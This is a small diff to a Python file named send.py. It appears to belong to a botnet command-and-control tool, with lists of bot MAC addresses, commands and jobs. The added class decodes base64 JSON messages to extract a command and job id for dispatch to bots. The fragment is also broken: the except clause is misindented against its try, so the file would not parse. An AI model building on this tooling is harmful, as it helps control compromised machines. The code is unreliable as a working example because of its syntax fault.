@@ -1,4 +1,5 @@
 # -*- coding: utf-8 -*-
+# send.py
 from bs4 import BeautifulSoup
 from requests.exceptions import ConnectionError
 import json
@@ -21,6 +22,22 @@ BOTS_MACADDR = []
 COMMANDS = []
 JOB_LIST = []
 
+class CommandToExcecute:
+    def __init__(self, message):
+        try:
+             data = json.loads(base64.b64decode(message))           
+             self.data = data
+             self.sender = data['sender']
+             self.receiver = data['receiver']
+             self.output = data['output']
+             self.cmd = data['cmd']
+             self.jobid = data['jobid']
+         except:
+             sys.exit()
+             
+    def retrieve_command(self):
+        return self.jobid, self.cmd
+          
 class CommandToSend:
     def __init__(self, sender, receiver, cmd):
         self.sender = sender
